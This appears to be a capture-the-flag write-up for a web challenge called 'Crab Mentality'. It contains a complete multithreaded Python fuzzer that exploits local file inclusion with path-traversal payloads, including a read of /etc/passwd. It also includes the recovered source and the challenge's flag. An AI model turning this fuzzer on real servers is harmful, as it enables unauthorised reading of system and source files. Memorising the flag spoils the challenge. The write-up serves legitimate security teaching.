# Web CTF Writeup: Crab Mentality

## Challenge Overview
"Crab Mentality" presented a seemingly impossible scenario. The web interface featured a "GET FLAG" button with a strict set of rules: click to register a request, wait exactly 5 minutes, and click again to claim the flag. The catch? If *any* other team requested a flag during that 5-minute window, both requests were canceled. Playing by the rules was a mathematical impossibility. It was time to cheat.

## Initial Reconnaissance
I started by inspecting the client-side source code. Two critical clues immediately stood out:
1. **The LFI Vector:** The JavaScript triggered a fetch request: `/getFlag?f=flag.txt`. Passing a filename directly via a GET parameter is a massive red flag for Local File Inclusion (LFI).
2. **The Developer Hint:** An HTML comment explicitly stated: ``.

This meant the goal wasn't to wait out the timer, but to use the LFI vulnerability to read backend source code or backup files.

## The Rabbit Hole & Fingerprinting
Because the challenge was named "Crab Mentality" (a nod to Ferris the crab), my initial hypothesis was a Rust backend. I fired up my terminal and used `ffuf` to fuzz the `?f=` parameter for common backup extensions (`.bak`, `.old`, `~`) and Rust source files like `src/main.rs`.

All my initial attempts returned `404 NOT FOUND`. However, by manually sending a few `curl` requests with the `-i` flag to inspect the headers, I caught a crucial detail in the response:

```http
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.6 Python/3.11.15
```

The application wasn't Rust at all; it was a Python Flask/Werkzeug server.

## Targeted Exploitation
Knowing it was a Flask application, my targets shifted to standard Python entry points like `app.py`, `server.py`, and `main.py`. Since standard wordlists weren't hitting the mark, I wrote a custom, multithreaded Python fuzzer to quickly test various path traversal depths combined with backup file extensions.

Here is the script I used to automate the attack:

```python
import requests
import concurrent.futures

URL = "[http://challenge.utctf.live:5888/getFlag?f=](http://challenge.utctf.live:5888/getFlag?f=)"
# Including session cookie to maintain state
COOKIES = {"team_token": "c920112ef44b82a3"}

PAYLOADS = [
    "flag.txt.bak", "flag.txt.old", "flag.txt~",
    "../../../../../../../../etc/passwd"
]

traversal_depths = ["", "../", "../../", "../../../", "../../../../"]
files_to_traverse = ["app.py", "server.py", "main.py", "wsgi.py", "__init__.py"]
extensions = ["", ".bak", ".old", "~"]

for depth in traversal_depths:
    for f in files_to_traverse:
        for ext in extensions:
            payload = f"{depth}{f}{ext}"
            if payload not in PAYLOADS:
                PAYLOADS.append(payload)

def test_payload(payload):
    target = URL + payload
    try:
        response = requests.get(target, cookies=COOKIES, timeout=5)
        if response.status_code == 200 and "The requested URL was not found" not in response.text:
            print(f"\n[+] BOOM! File found: {payload}")
            print("=" * 50)
            print(response.text[:1000])
            print("=" * 50)
            return True
    except requests.exceptions.RequestException:
        pass
    return False

def main():
    print(f"[*] Starting targeted LFI fuzzer with {len(PAYLOADS)} payloads...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(test_payload, PAYLOADS)
    print("\n[*] Fuzzing run complete.")

if __name__ == "__main__":
    main()
```

## The Breakthrough
The custom fuzzer was highly effective. Within seconds, it hit paydirt:

```text
[+] BOOM! File found: ../main.py.bak
```

The LFI successfully pulled the backend source code. Reviewing `main.py.bak`, I found what looked like a complex encryption routine using XOR and base64 encoding to generate the flag.

```python
import base64

_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]
# ... fake crypto logic follows ...
```

However, looking closely at the `_d` array, I realized the "encryption" logic at the bottom of the script was just a distraction. The array itself contained the raw ASCII hex values of the flag (e.g., `0x75` = 'u', `0x74` = 't').

By simply decoding the hex array back to ASCII, I completely bypassed the obfuscated math and retrieved the flag.

**Flag:** `utflag{y0u_e1th3r_w@1t_yr_turn_0r_cut_1n_l1ne}`
